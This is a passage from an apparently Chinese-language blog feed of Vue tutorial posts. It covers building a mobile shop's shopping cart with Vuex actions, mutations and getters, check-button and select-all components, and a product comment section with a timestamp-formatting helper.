oldProduct = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> context.state.cartList) &#123;</span><br><span class="line">      <span class="keyword">if</span> (item.iid === payload.iid) &#123;</span><br><span class="line">        oldProduct = item</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldProduct) &#123;</span><br><span class="line">      oldProduct.count += <span class="number">1</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      payload.count = <span class="number">1</span></span><br><span class="line">      context.state.cartList.push(payload)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，不建议在一个mutations中实现这么多个方法，也就是一个mutations只要对应一个方法就可，所以，我们将复杂的判断逻辑引到action中去（action不仅可以实现异步操作，同时也可以在里面实现复杂的逻辑判断），同时，我们用<code>find()</code>函数代替for遍历，简化代码，重构代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mutations: &#123;</span><br><span class="line">  addCounter(state,payload) &#123;</span><br><span class="line">    payload.count += <span class="number">1</span></span><br><span class="line">  &#125;,</span><br><span class="line">  addToCart(state,payload) &#123;</span><br><span class="line">    state.cartList.push(payload)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">actions: &#123;</span><br><span class="line">  addCart(context, payload) &#123;</span><br><span class="line">    <span class="comment">//查询是否存在该代码</span></span><br><span class="line">    <span class="keyword">let</span> oldProduct = context.state.cartList.find(<span class="function"><span class="params">item</span> =&gt;</span> item.iid === payload.iid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldProduct) &#123;</span><br><span class="line">      context.commit(<span class="string">'addCounter'</span>, oldProduct)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      payload.count = <span class="number">1</span></span><br><span class="line">      context.commit(<span class="string">'addToCart'</span>, payload)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>最后再进行文件分离，即将actions、mutations分离出单独的文件出来</p><h2 id="购物车导航条"><a href="#购物车导航条" class="headerlink" title="购物车导航条"></a>购物车导航条</h2><p>没啥可说，引入组件并进行相应修改，重点在于获取当前购物车的商品种类数量</p><h2 id="mapGetters"><a href="#mapGetters" class="headerlink" title="mapGetters"></a>mapGetters</h2><blockquote><p><code>mapGetters</code> 辅助函数仅仅是将 store 中的 getter 映射到局部计算属性</p></blockquote><p>也就是说，我们可以直接通过mapgetters得到vuex中的getter，并在computed中使用</p><p>定义vuex的getter，同时跟之前action、mutation一样将其分离出来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">  cartList(state) &#123;</span><br><span class="line">    <span class="keyword">return</span> state.cartList</span><br><span class="line">  &#125;,</span><br><span class="line">  cartCount(state, getters) &#123;</span><br><span class="line">    <span class="keyword">return</span> getters.cartList.length</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> getters</span><br></pre></td></tr></table></figure><p>在ShopCart组件中使用</p><p>首先导入mapGetters</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mapGetters &#125; <span class="keyword">from</span> <span class="string">'vuex'</span></span><br></pre></td></tr></table></figure><p>使用非常简单，类似解构赋值去使用getter</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  <span class="comment">//mapGetters的第一种用法</span></span><br><span class="line">  ...mapGetters([<span class="string">'cartCount'</span>]),</span><br><span class="line">  <span class="comment">//第二种用法</span></span><br><span class="line">  <span class="comment">// ...mapGetters(&#123;</span></span><br><span class="line">  <span class="comment">//   length: 'cartLength',</span></span><br><span class="line">  <span class="comment">//   list: 'cartList'</span></span><br><span class="line">  <span class="comment">// &#125;)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="商品展示"><a href="#商品展示" class="headerlink" title="商品展示"></a>商品展示</h2><p>创建子组件CartList.vue，主要用来包裹每个商品（CartListItem），同时引用scroll组件（注意scroll的高度设置）</p><p>并创建CartListItem，引入getters的cartList，使用for遍历循环展示每个商品</p><p>这里要注意，每次新加入商品，CartList都要在activated中做一次scroll刷新，否则高度固定，新加入商品，你就会发现拉不下去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;cart-list&quot;&gt;</span><br><span class="line">    &lt;scroll class&#x3D;&quot;wrapper&quot; ref&#x3D;&quot;scroll&quot;&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;cart-list-item v-for&#x3D;&quot;item in cartList&quot; :key&#x3D;&quot;item.iid&quot; :item-info&#x3D;&quot;item&quot;&gt;&lt;&#x2F;cart-list-item&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;scroll&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import Scroll from &#39;components&#x2F;common&#x2F;scroll&#x2F;scroll&#39;;</span><br><span class="line">  import CartListItem from &#39;.&#x2F;CartListItem&#39;;</span><br><span class="line">  import &#123; mapGetters &#125; from &#39;vuex&#39;;</span><br><span class="line"></span><br><span class="line">  export default &#123;</span><br><span class="line">name: &quot;CartList&quot;,</span><br><span class="line">    components: &#123;</span><br><span class="line">  Scroll, CartListItem</span><br><span class="line">    &#125;,</span><br><span class="line">    computed:&#123;</span><br><span class="line">      ...mapGetters([&#39;cartList&#39;]),</span><br><span class="line">    &#125;,</span><br><span class="line">    activated()&#123;</span><br><span class="line">      this.$refs.scroll.refresh();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.cart_list &#123;</span><br><span class="line">  height: calc(100% - 44px -49px - 50px);</span><br><span class="line">&#125;</span><br><span class="line">.wrapper &#123;</span><br><span class="line">  height: 100%;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h2 id="CheckButton"><a href="#CheckButton" class="headerlink" title="CheckButton"></a>CheckButton</h2><p>在创建CartListItem前，我们需要创建checkButton组件用来执行选中商品的相关操作</p><p>该组件主要问题就是选中时的样式和未选中的样式切换问题</p><p>我们定义一个prop用来决定选中与否样式的切换，并由引用该组件决定是否选中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;check-button&quot;&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;icon-selector&quot; :class&#x3D;&quot;&#123;&#39;selector-active&#39;: isChecked&#125;&quot;&gt;</span><br><span class="line">        &lt;img src&#x3D;&quot;~&#x2F;assets&#x2F;img&#x2F;cart&#x2F;tick.svg&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;CheckButton&quot;,</span><br><span class="line">    props: &#123;</span><br><span class="line">      isChecked: &#123;</span><br><span class="line">        type: Boolean,</span><br><span class="line">        default: false,</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .icon-selector &#123;</span><br><span class="line">    position: relative;</span><br><span class="line">    margin: 0;</span><br><span class="line">    width: 18px;</span><br><span class="line">    height: 18px;</span><br><span class="line">    border-radius: 50%;</span><br><span class="line">    border: 2px solid #ccc;</span><br><span class="line">    cursor: pointer;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .selector-active &#123;</span><br><span class="line">    background-color: #ff8198;</span><br><span class="line">    border-color: #ff8198;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h2 id="CartListItem"><a href="#CartListItem" class="headerlink" title="CartListItem"></a>CartListItem</h2><p>样式相关的不多讲，根据需求慢慢调，下面主要讲相关的逻辑实现</p><h3 id="商品展示-1"><a href="#商品展示-1" class="headerlink" title="商品展示"></a>商品展示</h3><p>props接收父组件传来的商品数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">props: &#123;</span><br><span class="line">  itemInfo: <span class="built_in">Object</span>,</span><br><span class="line">  <span class="keyword">default</span>()&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;shop-item&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;item-selector&quot;&gt;</span><br><span class="line">    &lt;check-button&gt;&lt;&#x2F;check-button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;item-img&quot;&gt;</span><br><span class="line">    &lt;img :src&#x3D;&quot;showImage&quot; alt&#x3D;&quot;商品图片&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;item-info&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;item-title&quot;&gt;&#123;&#123;itemInfo.title&#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;item-desc&quot;&gt;商品描述: &#123;&#123;itemInfo.desc&#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;info-bottom&quot;&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;item-price left&quot;&gt;¥&#123;&#123;itemInfo.price&#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;item-count right&quot;&gt;x&#123;&#123;itemInfo.count&#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h3 id="根据数据的对象模型判断商品是否选中"><a href="#根据数据的对象模型判断商品是否选中" class="headerlink" title="根据数据的对象模型判断商品是否选中"></a>根据数据的对象模型判断商品是否选中</h3><p>首先，在vuex的mutations中记录商品的选中状态</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addToCart(state,payload) &#123;</span><br><span class="line"><span class="comment">//商品选中状态</span></span><br><span class="line">  payload.checked = <span class="literal">true</span></span><br><span class="line">  state.cartList.push(payload)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在CartListItem绑定状态同时注册点击事件checkedChange</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;check-button :is-checked&#x3D;&quot;itemInfo.checked&quot; @click.native&#x3D;&quot;checkedChange&quot;&gt;&lt;&#x2F;check-button&gt;</span><br></pre></td></tr></table></figure><p>点击状态改变(直接取个反就ok)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  checkedChange() &#123;</span><br><span class="line">    <span class="keyword">this</span>.itemInfo.checked = !<span class="keyword">this</span>.itemInfo.checked</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="购物车底部栏CartBottomBar"><a href="#购物车底部栏CartBottomBar" class="headerlink" title="购物车底部栏CartBottomBar"></a>购物车底部栏CartBottomBar</h2><p>依旧是先创建组件并引入以及相关样式修改然后就是将checkButton引入当作全选按钮</p><h3 id="选中商品总价"><a href="#选中商品总价" class="headerlink" title="选中商品总价"></a>选中商品总价</h3><p>这里要计算出当前选中的商品的总价，所以使用filter做商品过滤之后再用reduce做价格总和，在computed中进行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">totalPrice() &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'￥'</span> + <span class="keyword">this</span>.$store.state.cartList.filter(<span class="function"><span class="params">item</span> =&gt;</span> item.checked).reduce(<span class="function">(<span class="params">preValue, item</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> preValue + item.count * item.price</span><br><span class="line">   &#125;, <span class="number">0</span>).toFixed(<span class="number">2</span>) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="当前选中商品种类数量"><a href="#当前选中商品种类数量" class="headerlink" title="当前选中商品种类数量"></a>当前选中商品种类数量</h3><p>同样的方式对选中的商品进行总数计算</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkLength() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.cartList.filter(<span class="function"><span class="params">item</span> =&gt;</span> item.checked).length</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="显示全选状态"><a href="#显示全选状态" class="headerlink" title="显示全选状态"></a>显示全选状态</h3><p>首先绑定CheckButton组件的选中状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;CheckButton class&#x3D;&quot;select-all&quot; :isChecked&#x3D;&quot;isSelectAll&quot;&gt;&lt;&#x2F;CheckButton&gt;</span><br></pre></td></tr></table></figure><p>这里实现的思路主要是：只要有一个商品没选中，那么当前CheckButton的状态就是未选中，所以这里对cartList进行过滤，只要有一个商品未选中，那么该方法总会返回一个至少为1的值，取反之后则为false（除了0其他数字皆为true），则当前为未全选状态，当然你也可以使用find()函数或者for循环完成该逻辑</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">isSelectAll() &#123;</span><br><span class="line">  <span class="keyword">return</span> !<span class="keyword">this</span>.$store.state.cartList.filter(<span class="function"><span class="params">item</span> =&gt;</span> </span><br><span class="line">    item.checked === <span class="literal">false</span>).length</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="点击全选与否切换"><a href="#点击全选与否切换" class="headerlink" title="点击全选与否切换"></a>点击全选与否切换</h3><p>绑定CheckButton的点击事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;CheckButton class&#x3D;&quot;select-all&quot; :isChecked&#x3D;&quot;isSelectAll&quot; @click.native &#x3D; &quot;checkClick&quot;&gt;&lt;&#x2F;CheckButton&gt;</span><br></pre></td></tr></table></figure><p>然后实现点击切换全选与否</p><p>主要对上面的isSelectAll计算属性进行判断，若为全选状态，则对所有商品进行遍历将选择状态改为false，否则，执行相反操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checkClick() &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.isSelectAll) &#123;</span><br><span class="line">    <span class="keyword">this</span>.$store.state.cartList.forEach(<span class="function"><span class="params">item</span> =&gt;</span> item.checked = <span class="literal">false</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.$store.state.cartList.forEach(<span class="function"><span class="params">item</span> =&gt;</span> item.checked = <span class="literal">true</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.详情页下</title>
      <link href="/2021/03/02/6.%E8%AF%A6%E6%83%85%E9%A1%B5%E4%B8%8B/"/>
      <url>/2021/03/02/6.%E8%AF%A6%E6%83%85%E9%A1%B5%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="商品评论数据"><a href="#商品评论数据" class="headerlink" title="商品评论数据"></a>商品评论数据</h2><ol><li><p>获取评论数据</p><p>这里，并不是每个商品都有评论，这里根据每个商品是否有评论在进行数据请求并渲染</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取评论数据</span></span><br><span class="line"><span class="keyword">if</span> (data.rate.cRate !== <span class="number">0</span>) &#123;&#125;</span><br><span class="line">  <span class="keyword">this</span>.commentInfo = data.rate.list[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></li><li><p>创建组件(DetailCommentInfo)</p><p>这里需要展示评论的发表日期，但是接口传过来的是时间戳，所以我们需要讲时间戳转化为具体的日期格式，通过直接使用利用正则表达式的时间戳转化函数以及vue的过滤器将时间进行展示</p><p>在utils加入以下转化代码（别人写好的转化函数）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">formatDate</span>(<span class="params">date, fmt</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/(y+)/</span>.test(fmt)) &#123;</span><br><span class="line">    fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (date.getFullYear() + <span class="string">''</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> o = &#123;</span><br><span class="line">    <span class="string">'M+'</span>: date.getMonth() + <span class="number">1</span>,</span><br><span class="line">    <span class="string">'d+'</span>: date.getDate(),</span><br><span class="line">    <span class="string">'h+'</span>: date.getHours(),</span><br><span class="line">    <span class="string">'m+'</span>: date.getMinutes(),</span><br><span class="line">    <span class="string">'s+'</span>: date.getSeconds()</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> k <span class="keyword">in</span> o) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">`(<span class="subst">$&#123;k&#125;</span>)`</span>).test(fmt)) &#123;</span><br><span class="line">      <span class="keyword">let</span> str = o[k] + <span class="string">''</span>;</span><br><span class="line">      fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length === <span class="number">1</span>) ? str : padLeftZero(str));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fmt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">padLeftZero</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="string">'00'</span> + str).substr(str.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在DetailCommentInfo组件进行引用并在过滤器使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filters: &#123;</span><br><span class="line">showDate: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>(value*<span class="number">1000</span>)</span><br><span class="line">    <span class="comment">//参数1：时间戳；参数2：具体的时间格式yyyy-mm-dd</span></span><br><span class="line">    <span class="keyword">return</span> formatDate(date, <span class="string">'yyyy-MM-dd'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span class&#x3D;&quot;date&quot;&gt;&#123;&#123;commentInfo.created | showDate&#125;&#125;&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure><p>完整组件代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;div v-if&#x3D;&quot;Object.keys(commentInfo).length !&#x3D;&#x3D; 0&quot; class&#x3D;&quot;comment-info&quot;&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;info-header&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;header-title&quot;&gt;用户评价&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;header-more&quot;&gt;</span><br><span class="line">          更多</span><br><span class="line">          &lt;i class&#x3D;&quot;arrow-right&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;info-user&quot;&gt;</span><br><span class="line">        &lt;img :src&#x3D;&quot;commentInfo.user.avatar&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">        &lt;span&gt;&#123;&#123;commentInfo.user.uname&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;info-detail&quot;&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;commentInfo.content&#125;&#125;&lt;&#x2F;p&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;info-other&quot;&gt;</span><br><span class="line">          &lt;span class&#x3D;&quot;date&quot;&gt;&#123;&#123;commentInfo.created | showDate&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">          &lt;span&gt;&#123;&#123;commentInfo.style&#125;&#125;&lt;&#x2F;span&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;info-imgs&quot;&gt;</span><br><span class="line">          &lt;img :src&#x3D;&quot;item&quot; v-for&#x3D;&quot;(item, index) in commentInfo.images&quot; 